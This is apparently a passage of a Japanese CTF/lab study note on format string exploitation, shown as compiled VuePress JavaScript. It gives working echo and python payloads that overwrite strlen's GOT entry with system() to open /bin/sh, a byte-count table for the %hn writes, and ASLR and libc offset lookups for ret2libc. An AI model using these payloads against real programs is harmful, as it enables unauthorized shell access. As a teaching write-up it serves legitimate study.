t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("$ "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" -e "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\\x24\\xa0\\x04\\x08%7"),e("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$s")]),t._v("'")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./fsb \n$�xV4\nsecret"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("0x12345678\n$ "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" -e "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\\x24\\xa0\\x04\\x08%7"),e("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$n")]),t._v("'")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./fsb \n$�\nsecret"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("0x4\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br"),e("span",{staticClass:"line-number"},[t._v("5")]),e("br"),e("span",{staticClass:"line-number"},[t._v("6")]),e("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("h2",{attrs:{id:"got-overwrite"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#got-overwrite","aria-hidden":"true"}},[this._v("#")]),this._v(" GOT Overwrite")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h3",{attrs:{id:"what-s-got"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#what-s-got","aria-hidden":"true"}},[this._v("#")]),this._v(" What's GOT?")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h3",{attrs:{id:"攻撃手法の策定"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#攻撃手法の策定","aria-hidden":"true"}},[this._v("#")]),this._v(" 攻撃手法の策定")])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("$ readelf -r got\n\nRelocation section "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("'.rel.dyn'")]),t._v(" at offset 0x318 contains 2 entries:\n Offset     Info    Type            Sym.Value  Sym. Name\n08049ff8  00000406 R_386_GLOB_DAT    00000000   __gmon_start__\n08049ffc  00000706 R_386_GLOB_DAT    00000000   stdin@GLIBC_2.0\n\nRelocation section "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("'.rel.plt'")]),t._v(" at offset 0x328 contains 5 entries:\n Offset     Info    Type            Sym.Value  Sym. Name\n0804a00c  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0\n0804a010  00000207 R_386_JUMP_SLOT   00000000   fgets@GLIBC_2.0\n0804a014  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4\n0804a018  00000507 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0\n0804a01c  00000607 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br"),e("span",{staticClass:"line-number"},[t._v("5")]),e("br"),e("span",{staticClass:"line-number"},[t._v("6")]),e("br"),e("span",{staticClass:"line-number"},[t._v("7")]),e("br"),e("span",{staticClass:"line-number"},[t._v("8")]),e("br"),e("span",{staticClass:"line-number"},[t._v("9")]),e("br"),e("span",{staticClass:"line-number"},[t._v("10")]),e("br"),e("span",{staticClass:"line-number"},[t._v("11")]),e("br"),e("span",{staticClass:"line-number"},[t._v("12")]),e("br"),e("span",{staticClass:"line-number"},[t._v("13")]),e("br"),e("span",{staticClass:"line-number"},[t._v("14")]),e("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("p",[this._v("これより, strlen関数が"),s("code",[this._v("0x0804a018")]),this._v("に書き込まれることがわかる。")])},function(){var t=this.$createElement,s=this._self._c||t;return s("p",[this._v("次に, system関数のアドレスを確認する。\ngdbによって確認すると, "),s("code",[this._v("0xf7e16200")]),this._v("であることがわかる。")])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("gdb-peda$ p system\n"),e("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$1")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("text variable, no debug info"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(" 0xf7e16200 "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("system"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br")])])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("p",[t._v("以上の情報を用いて, strlen関数をsystem関数で上書きする。\nアドレスが8バイトなので, "),e("code",[t._v("%hn")]),t._v("を用いて2回に分けて攻撃を行う。\n"),e("code",[t._v("0x0804a018~0x0804a019")]),t._v("に"),e("code",[t._v("0x6200")]),t._v(",\n"),e("code",[t._v("0x0804a01a~0x0804a01b")]),t._v("に"),e("code",[t._v("0xf7e1")]),t._v("を書き込む。")])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("$ "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" -e "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("'AAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p'")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./got \nAAAA,0x80,0xf7fb15c0,0x8048520,"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("nil"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",0xf7fdff9b,0x804822c,0x41414141,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70\n44\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("h2",{attrs:{id:"攻撃手法のまとめ"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#攻撃手法のまとめ","aria-hidden":"true"}},[this._v("#")]),this._v(" 攻撃手法のまとめ")])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("table",[e("thead",[e("tr",[e("th",{staticStyle:{"text-align":"center"}},[t._v("書式文字列")]),t._v(" "),e("th",{staticStyle:{"text-align":"center"}},[t._v("補足")]),t._v(" "),e("th",{staticStyle:{"text-align":"center"}},[t._v("出力バイト数")]),t._v(" "),e("th",{staticStyle:{"text-align":"center"}},[t._v("積算出力バイト数")])])]),t._v(" "),e("tbody",[e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("0x0804a018")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("GOT領域のstrlen(1)")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("4")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("4")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("0x0804a01a")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("GOT領域のstrlen(2)")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("4")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("8")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("%25080x")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("25088-8=25080")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("25080")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("25088(=0x6200)")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("%7$hn")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("strlenの前半4バイトを埋める")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("25088")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("%38369x")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("63457-25088=38369")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("38369")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("63457(=0xf7e1)")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("%8$hn")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("strlenの後半4バイトを埋める")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("0")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("63457")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("\\n")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("2回目にくるfgets関数のために改行を入れておく")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("-")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("-")])]),t._v(" "),e("tr",[e("td",{staticStyle:{"text-align":"center"}},[t._v("/bin/sh; cat")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("shellを立ち上げる")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("-")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[t._v("-")])])])])},function(){var t=this.$createElement,s=this._self._c||t;return s("h4",{attrs:{id:"echo-ver"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#echo-ver","aria-hidden":"true"}},[this._v("#")]),this._v(" echo ver.")])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("e$ "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("echo -e "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\\x18\\xa0\\x04\\x08\\x1a\\xa0\\x04\\x08%25080x%7"),e("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$hn")]),t._v("%38369x%8"),e("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$hn")]),t._v("\\n/bin/sh'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" cat"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./got \n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("h4",{attrs:{id:"python-ver"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#python-ver","aria-hidden":"true"}},[this._v("#")]),this._v(" python ver.")])},function(){var t=this.$createElement,s=this._self._c||t;return s("p",[s("strong",[this._v("/bin/shの後に\\x00を入れることで, 文字列の分割を行なっている。")])])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("$ "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("python -c "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("'import sys;sys.stdout.buffer.write(b\"\\x18\\xa0\\x04\\x08\\x1a\\xa0\\x04\\x08%25080x%7"),e("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$hn")]),t._v("%38369x%8"),e("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$hn")]),t._v("\\n/bin/sh\\x00\\n\")'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./got\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("h2",{attrs:{id:"aslrの回避"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#aslrの回避","aria-hidden":"true"}},[this._v("#")]),this._v(" ASLRの回避")])},function(){var t=this.$createElement,s=this._self._c||t;return s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[this._v("$ "),s("span",{pre:!0,attrs:{class:"token function"}},[this._v("sudo")]),this._v(" sysctl -w kernel.randomize_va_space"),s("span",{pre:!0,attrs:{class:"token operator"}},[this._v("=")]),this._v("2\n")])]),this._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[this._v("1")]),s("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("p",[s("code",[this._v("ldd")]),this._v("コマンドを使用することで, 共有ライブラリのメモリアドレスを確認する。\nすると, randomizeされていることが確認できる。")])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("sudo")]),t._v(" sysctl -w kernel.randomize_va_space"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("2\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("sudo"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" password "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" task4233: \nkernel.randomize_va_space "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" 2\ntask4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ ldd bof4\n  linux-gate.so.1 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f0e000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  libc.so.6 "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/i386-linux-gnu/libc.so.6 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7d10000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  /lib/ld-linux.so.2 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f10000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\ntask4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ ldd bof4\n  linux-gate.so.1 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f24000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  libc.so.6 "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/i386-linux-gnu/libc.so.6 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7d26000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  /lib/ld-linux.so.2 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f26000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\ntask4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ ldd bof4\n  linux-gate.so.1 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f74000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  libc.so.6 "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/i386-linux-gnu/libc.so.6 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7d76000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  /lib/ld-linux.so.2 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f76000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\ntask4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ ldd bof4\n  linux-gate.so.1 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7efa000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  libc.so.6 "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/i386-linux-gnu/libc.so.6 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7cfc000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  /lib/ld-linux.so.2 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7efc000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\ntask4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ ldd bof4\n  linux-gate.so.1 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f2e000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  libc.so.6 "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/i386-linux-gnu/libc.so.6 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7d30000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  /lib/ld-linux.so.2 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f30000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\ntask4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ ldd bof4\n  linux-gate.so.1 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f88000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  libc.so.6 "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/i386-linux-gnu/libc.so.6 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7d8a000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  /lib/ld-linux.so.2 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f8a000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\ntask4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ ldd bof4\n  linux-gate.so.1 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7fc7000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  libc.so.6 "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/i386-linux-gnu/libc.so.6 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7dc9000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  /lib/ld-linux.so.2 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7fc9000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\ntask4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ ldd bof4\n  linux-gate.so.1 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7fbc000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  libc.so.6 "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/i386-linux-gnu/libc.so.6 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7dbe000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  /lib/ld-linux.so.2 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7fbe000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\ntask4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ ldd bof4\n  linux-gate.so.1 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7ee1000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  libc.so.6 "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/i386-linux-gnu/libc.so.6 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7ce3000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  /lib/ld-linux.so.2 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7ee3000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\ntask4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ ldd bof4\n  linux-gate.so.1 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f1b000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  libc.so.6 "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/i386-linux-gnu/libc.so.6 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7d1d000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  /lib/ld-linux.so.2 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f1d000"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br"),e("span",{staticClass:"line-number"},[t._v("5")]),e("br"),e("span",{staticClass:"line-number"},[t._v("6")]),e("br"),e("span",{staticClass:"line-number"},[t._v("7")]),e("br"),e("span",{staticClass:"line-number"},[t._v("8")]),e("br"),e("span",{staticClass:"line-number"},[t._v("9")]),e("br"),e("span",{staticClass:"line-number"},[t._v("10")]),e("br"),e("span",{staticClass:"line-number"},[t._v("11")]),e("br"),e("span",{staticClass:"line-number"},[t._v("12")]),e("br"),e("span",{staticClass:"line-number"},[t._v("13")]),e("br"),e("span",{staticClass:"line-number"},[t._v("14")]),e("br"),e("span",{staticClass:"line-number"},[t._v("15")]),e("br"),e("span",{staticClass:"line-number"},[t._v("16")]),e("br"),e("span",{staticClass:"line-number"},[t._v("17")]),e("br"),e("span",{staticClass:"line-number"},[t._v("18")]),e("br"),e("span",{staticClass:"line-number"},[t._v("19")]),e("br"),e("span",{staticClass:"line-number"},[t._v("20")]),e("br"),e("span",{staticClass:"line-number"},[t._v("21")]),e("br"),e("span",{staticClass:"line-number"},[t._v("22")]),e("br"),e("span",{staticClass:"line-number"},[t._v("23")]),e("br"),e("span",{staticClass:"line-number"},[t._v("24")]),e("br"),e("span",{staticClass:"line-number"},[t._v("25")]),e("br"),e("span",{staticClass:"line-number"},[t._v("26")]),e("br"),e("span",{staticClass:"line-number"},[t._v("27")]),e("br"),e("span",{staticClass:"line-number"},[t._v("28")]),e("br"),e("span",{staticClass:"line-number"},[t._v("29")]),e("br"),e("span",{staticClass:"line-number"},[t._v("30")]),e("br"),e("span",{staticClass:"line-number"},[t._v("31")]),e("br"),e("span",{staticClass:"line-number"},[t._v("32")]),e("br"),e("span",{staticClass:"line-number"},[t._v("33")]),e("br"),e("span",{staticClass:"line-number"},[t._v("34")]),e("br"),e("span",{staticClass:"line-number"},[t._v("35")]),e("br"),e("span",{staticClass:"line-number"},[t._v("36")]),e("br"),e("span",{staticClass:"line-number"},[t._v("37")]),e("br"),e("span",{staticClass:"line-number"},[t._v("38")]),e("br"),e("span",{staticClass:"line-number"},[t._v("39")]),e("br"),e("span",{staticClass:"line-number"},[t._v("40")]),e("br"),e("span",{staticClass:"line-number"},[t._v("41")]),e("br"),e("span",{staticClass:"line-number"},[t._v("42")]),e("br"),e("span",{staticClass:"line-number"},[t._v("43")]),e("br"),e("span",{staticClass:"line-number"},[t._v("44")]),e("br"),e("span",{staticClass:"line-number"},[t._v("45")]),e("br"),e("span",{staticClass:"line-number"},[t._v("46")]),e("br"),e("span",{staticClass:"line-number"},[t._v("47")]),e("br"),e("span",{staticClass:"line-number"},[t._v("48")]),e("br"),e("span",{staticClass:"line-number"},[t._v("49")]),e("br"),e("span",{staticClass:"line-number"},[t._v("50")]),e("br"),e("span",{staticClass:"line-number"},[t._v("51")]),e("br"),e("span",{staticClass:"line-number"},[t._v("52")]),e("br"),e("span",{staticClass:"line-number"},[t._v("53")]),e("br"),e("span",{staticClass:"line-number"},[t._v("54")]),e("br")])])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("$ nm -D /lib/i386-linux-gnu/libc.so.6 "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("grep")]),t._v(" system\n0003d200 T __libc_system\n00129640 T svcerr_systemerr\n0003d200 W system\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("p",[this._v("すると,　"),s("code",[this._v("0x0003d200")]),this._v("に格納されていることがわかる。")])},function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[t._v("$ strings -tx /lib/i386-linux-gnu/libc.so.6 "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("grep")]),t._v(" /bin/sh\n 17e0cf /bin/sh\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("p",[this._v("同様にして, /bin/shも調べると"),s("code",[this._v("0x0017e0cf")]),this._v("に格納されていることがわかる。")])},function(){var t=this.$createElement,s=this._self._c||t;return s("p",[this._v("これらを元に, 